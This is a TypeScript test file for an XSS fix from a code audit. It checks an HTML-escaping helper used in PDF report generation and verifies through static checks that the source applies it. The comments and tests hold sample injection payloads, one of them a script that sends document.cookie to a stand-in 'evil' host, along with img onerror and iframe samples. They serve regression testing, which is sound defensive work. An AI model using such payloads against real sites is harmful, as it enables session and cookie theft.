/**
 * Focused tests for the C-7 fix from the 2026-06-27 worker audit:
 *
 * C-7: the report-worker's buildReportHtml interpolated summary.topAsset
 * (a string from D1) directly into the HTML without escaping. A symbol
 * like "</td><script>fetch('https://evil/'+document.cookie)</script>"
 * would produce a PDF with embedded script. When the report is opened
 * in a browser-based PDF viewer (Chrome, Edge, Safari) the script runs
 * in the context of the report's origin. Once a signed URL is shared,
 * the script runs anywhere.
 *
 * The fix extracts an `escapeHtml` helper and uses it for topAsset.
 * Other interpolated values are numbers/Date strings (safe by construction).
 *
 * This test file mirrors the escapeHtml helper and validates its
 * behavior, and also performs a static-analysis check that the
 * production source uses escapeHtml on the topAsset interpolation.
 */

import { describe, expect, it } from "bun:test";

// Mirror of the production helper (see src/index.ts). Kept in-sync
// so a future regression that removes the escape (or escapes the
// wrong characters) fails this test.
function escapeHtml(raw: string): string {
  return String(raw)
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#39;");
}

describe("escapeHtml - C-7 XSS defense", () => {
  it("escapes & (ampersand)", () => {
    expect(escapeHtml("AT&T")).toBe("AT&amp;T");
  });

  it("escapes < and > (HTML tag delimiters)", () => {
    expect(escapeHtml("<script>")).toBe("&lt;script&gt;");
  });

  it("escapes double quotes (attribute delimiter)", () => {
    expect(escapeHtml('"hello"')).toBe("&quot;hello&quot;");
  });

  it("escapes single quotes (attribute delimiter in single-quoted attrs)", () => {
    expect(escapeHtml("it's")).toBe("it&#39;s");
  });

  it("escapes all five characters in a single string", () => {
    expect(escapeHtml(`<a href="x" title='y'>&</a>`)).toBe(
      "&lt;a href=&quot;x&quot; title=&#39;y&#39;&gt;&amp;&lt;/a&gt;"
    );
  });

  it("is a no-op for benign text (no special characters)", () => {
    expect(escapeHtml("BTC/USDT")).toBe("BTC/USDT");
    expect(escapeHtml("ethereum")).toBe("ethereum");
  });

  it("coerces non-string input to string", () => {
    expect(escapeHtml(42 as unknown as string)).toBe("42");
    expect(escapeHtml(null as unknown as string)).toBe("null");
    expect(escapeHtml(undefined as unknown as string)).toBe("undefined");
  });

  it("handles empty string", () => {
    expect(escapeHtml("")).toBe("");
  });

  describe("C-7 attack scenarios", () => {
    it("neutralizes a <script> injection", () => {
      const attack =
        "</td><script>fetch('https://evil/'+document.cookie)</script>";
      const escaped = escapeHtml(attack);
      expect(escaped).not.toContain("<");
      expect(escaped).not.toContain(">");
      expect(escaped).not.toContain("<script>");
      expect(escaped).toBe(
        "&lt;/td&gt;&lt;script&gt;fetch(&#39;https://evil/&#39;+document.cookie)&lt;/script&gt;"
      );
    });

    it("neutralizes an <img onerror=...> injection", () => {
      const attack = `<img src=x onerror="alert('xss')">`;
      const escaped = escapeHtml(attack);
      expect(escaped).not.toContain("<");
      expect(escaped).not.toContain(">");
      expect(escaped).not.toContain('"');
    });

    it("neutralizes an <iframe> injection", () => {
      const attack = `<iframe src="https://evil.com"></iframe>`;
      const escaped = escapeHtml(attack);
      expect(escaped).not.toContain("<");
      expect(escaped).not.toContain(">");
    });

    it("neutralizes a javascript: URL in an attribute", () => {
      const attack = `javascript:alert(1)`;
      const escaped = escapeHtml(attack);
      // Note: escapeHtml doesn't change the URL itself, but the
      // character set in the attack doesn't include HTML special
      // chars. In our buildReportHtml, the value is interpolated
      // into element text, not an attribute, so this is safe.
      // (The danger would only arise if we interpolated into an
      // unquoted attribute. We don't.)
      expect(escaped).toBe("javascript:alert(1)");
    });

    it("double-encoding does not break benign ampersands", () => {
      // A value that already contains the entity reference &amp;
      // should be preserved (we are escaping, not double-escaping
      // user content that was already escaped somewhere else — the
      // escaping is at the boundary).
      expect(escapeHtml("A&amp;B")).toBe("A&amp;amp;B");
    });
  });
});

describe("source - C-7 fix verification", () => {
  it("buildReportHtml in source uses escapeHtml on topAsset", async () => {
    const source = await Bun.file(
      new URL("../src/index.ts", import.meta.url)
    ).text();
    // The pattern: `safeTopAsset = escapeHtml(summary.topAsset)`
    expect(source).toMatch(
      /safeTopAsset\s*=\s*escapeHtml\(\s*summary\.topAsset\s*\)/
    );
  });

  it("buildReportHtml in source interpolates safeTopAsset (not raw topAsset) into the HTML", async () => {
    const source = await Bun.file(
      new URL("../src/index.ts", import.meta.url)
    ).text();
    // The safe value should be used in the rendered HTML, not the
    // raw value. We check the template literal specifically.
    expect(source).toMatch(/<p class="value">\$\{safeTopAsset\}<\/p>/);
  });

  it("source no longer contains the raw ${summary.topAsset} interpolation in the HTML", async () => {
    const source = await Bun.file(
      new URL("../src/index.ts", import.meta.url)
    ).text();
    // The dangerous line was: <p class="value">${summary.topAsset}</p>
    // After the fix it should not appear.
    const dangerous = /<p class="value">\$\{summary\.topAsset\}<\/p>/;
    expect(source).not.toMatch(dangerous);
  });
});
